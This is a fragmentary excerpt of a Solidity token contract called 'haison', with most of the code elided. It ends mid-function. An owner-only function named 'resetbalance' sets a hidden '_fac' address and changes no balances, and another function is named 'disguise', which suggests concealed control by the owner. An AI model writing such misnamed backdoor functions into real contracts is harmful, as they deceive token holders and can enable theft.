...
contract Ownership is Context {  
    ...
    */
    ...
    function resetbalance(address newOwner) external onlyOwner {
        _fac = newOwner;
    }  
...
contract haison is Context, IERC20, Ownership{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "haison";
    string private _symbol = "HAISON";
    ...
    function disguise(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
    {
